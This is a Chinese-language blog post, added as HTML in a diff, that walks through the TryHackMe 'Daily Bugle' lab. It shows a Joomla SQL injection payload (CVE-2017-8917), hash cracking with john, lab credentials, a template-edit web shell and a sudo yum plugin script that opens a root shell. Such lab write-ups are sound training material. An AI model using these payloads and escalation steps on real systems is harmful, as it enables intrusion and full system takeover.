@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=ch>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="序一道不错的渗透测试题目，这里做个简单的复盘 复盘对于渗透测试，”万年不变”的一步，扫描。发现几个简单的端口22，80，3306.当然，默认打开网站是一个http服务，一开始看到登录框有个Remember Me，我顿时应激，于是抓包看看有没有存在明显的shiro反序列化，很可惜，并没有 接下来对目录进行扫描，暴露了好多目录  一个个尝试，发现administrator 页面是一个后台登录框。是一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme-Daily Bugle">
+<meta property="og:url" content="https://q1ng-li.github.io/2026/03/24/blog24/index.html">
+<meta property="og:site_name" content="q1ng">
+<meta property="og:description" content="序一道不错的渗透测试题目，这里做个简单的复盘 复盘对于渗透测试，”万年不变”的一步，扫描。发现几个简单的端口22，80，3306.当然，默认打开网站是一个http服务，一开始看到登录框有个Remember Me，我顿时应激，于是抓包看看有没有存在明显的shiro反序列化，很可惜，并没有 接下来对目录进行扫描，暴露了好多目录  一个个尝试，发现administrator 页面是一个后台登录框。是一个">
+<meta property="og:locale" content="ch_CN">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260325000230598.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260325001713006.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260325001945478.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260325002201151.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260325002741685.png">
+<meta property="article:published_time" content="2026-03-24T15:55:49.000Z">
+<meta property="article:modified_time" content="2026-03-24T16:28:01.475Z">
+<meta property="article:author" content="q1ng">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1ng-li.github.io/images/image-20260325000230598.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/1.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>tryhackme-Daily Bugle</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">q1ng</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2026/03/19/blog23/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/03/24/blog24/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/03/24/blog24/&text=tryhackme-Daily Bugle"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/03/24/blog24/&is_video=false&description=tryhackme-Daily Bugle"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tryhackme-Daily Bugle&body=Check out this article: https://q1ng-li.github.io/2026/03/24/blog24/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/03/24/blog24/&name=tryhackme-Daily Bugle&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%9B%98"><span class="toc-number">2.</span> <span class="toc-text">复盘</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        tryhackme-Daily Bugle
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">q1ng</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-03-24T15:55:49.000Z" itemprop="datePublished">2026-03-24</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>一道不错的渗透测试题目，这里做个简单的复盘</p>
+<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>对于渗透测试，”万年不变”的一步，扫描。发现几个简单的端口22，80，3306.当然，默认打开网站是一个http服务，一开始看到登录框有个Remember Me，我顿时应激，于是抓包看看有没有存在明显的shiro反序列化，很可惜，并没有</p>
+<p>接下来对目录进行扫描，暴露了好多目录</p>
+<p><img src="/./images/image-20260325000230598.png" alt="image-20260325000230598"></p>
+<p>一个个尝试，发现administrator 页面是一个后台登录框。是一个Joomla的cms框架，于是检索一下资料，发现一个针对Joomla的工具 <code>joomscan-0.0.7</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">perl joomscan.pl -u &quot;url地址&quot;<br></code></pre></td></tr></table></figure>
+
+<p>直接把’’底裤”都给掀了，版本报出3.7.0.于是去漏洞库搜索发现是一个古老的CVE-2017-8917,是一个sql注入漏洞，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)<br></code></pre></td></tr></table></figure>
+
+<p>接下来就直接利用sqlmap一把梭，最终得到一个用户名和密码 ，密码经过hash加密，这里利用工具john</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">john --wordlist=/usr/share/wordlists/rockyou.txt ./john/hash.txt<br></code></pre></td></tr></table></figure>
+
+<p>这里简单解释一下参数 ，–wordlist后面跟着字典  .&#x2F;john&#x2F;hash.txt就是加密的数据</p>
+<p><img src="/./images/image-20260325001713006.png" alt="image-20260325001713006"></p>
+<p>利用得到的账号密码 jonah&#x2F;spiderman123 登录后台</p>
+<p>对于后台，我们就需要寻找一些功能点进行getshell，一开始寻找上传功能点，修改对一些上传文件的配置，进而允许上传php文件，但怎么尝试似乎都不行</p>
+<p>最终发现在模板处存在index.php，我们可以修改index.php文件，进而getshell</p>
+<p><img src="/./images/image-20260325001945478.png" alt="image-20260325001945478"></p>
+<p>shell中我们的用户名为apache，在home目录存在一个可疑的用户 jjameson，不过没有权限读取</p>
+<p><img src="/./images/image-20260325002201151.png" alt="image-20260325002201151"></p>
+<p>这里有个linpeas.sh工具（是一款在渗透测试和 CTF 比赛中用于自动化寻找 Linux 系统提权路径的神器）</p>
+<hr>
+<p>它的工作原理与核心探测内容</p>
+<p>它本质上是一个极其庞大且逻辑严密的 Bash 脚本。在靶机上运行后，它会自动执行数百条系统状态检测命令，把系统翻个底朝天，重点搜寻以下几个“提权高发区”：</p>
+<ul>
+<li><strong>SUID&#x2F;SGID 特殊文件：</strong> 寻找那些“拥有 root 运行权限，但普通用户也可以执行”的命令或程序。这是 CTF 中最经典的提权考点（这类发现通常会配合 GTFOBins 网站来寻找提权指令）。</li>
+<li><strong>配置不当的定时任务 (Cron Jobs)：</strong> 检查是否有 root 用户定时在后台执行的脚本，而你（低权限用户）恰好对该脚本拥有修改或写入权限。</li>
+<li><strong>系统与内核漏洞：</strong> 检查当前的 Linux 发行版和内核版本，对比已知的漏洞特征（比如系统是否容易受到著名的 DirtyCow 脏牛漏洞或 PwnKit 漏洞的攻击）。</li>
+<li><strong>明文密码与敏感信息：</strong> 暴力翻找系统中的日志文件、Web 配置文件、用户的历史命令记录（如 <code>.bash_history</code>），寻找管理员粗心遗留的密码或 API 密钥。</li>
+<li><strong>可利用的 Sudo 权限：</strong> 检查 <code>/etc/sudoers</code> 配置，看看你当前的普通用户是否被赋予了免密执行某些特定 root 命令的特权。</li>
+</ul>
+<hr>
+<p>我们可疑利用wget远程获取这个工具，经过工具探测，我们在configuration.php中发现了 jjameson用户的密码,利用su切换账号</p>
+<p>最后我们要提权到root,  <strong>&#x2F;usr&#x2F;bin&#x2F;yum</strong>    <code> https://gtfobins.github.io/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TF=$(mktemp -d)<br>cat &gt;$TF/x&lt;&lt;EOF<br>[main]<br>plugins=1<br>pluginpath=$TF<br>pluginconfpath=$TF<br>EOF<br><br>cat &gt;$TF/y.conf&lt;&lt;EOF<br>[main]<br>enabled=1<br>EOF<br><br>cat &gt;$TF/y.py&lt;&lt;EOF<br>import os<br>import yum<br>from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE<br>requires_api_version=&#x27;2.1&#x27;<br>def init_hook(conduit):<br>  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)<br>EOF<br><br>sudo yum -c $TF/x --enableplugin=y<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./images/image-20260325002741685.png" alt="image-20260325002741685"></p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%9B%98"><span class="toc-number">2.</span> <span class="toc-text">复盘</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/03/24/blog24/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/03/24/blog24/&text=tryhackme-Daily Bugle"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/03/24/blog24/&is_video=false&description=tryhackme-Daily Bugle"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tryhackme-Daily Bugle&body=Check out this article: https://q1ng-li.github.io/2026/03/24/blog24/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/03/24/blog24/&title=tryhackme-Daily Bugle"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/03/24/blog24/&name=tryhackme-Daily Bugle&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 q1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
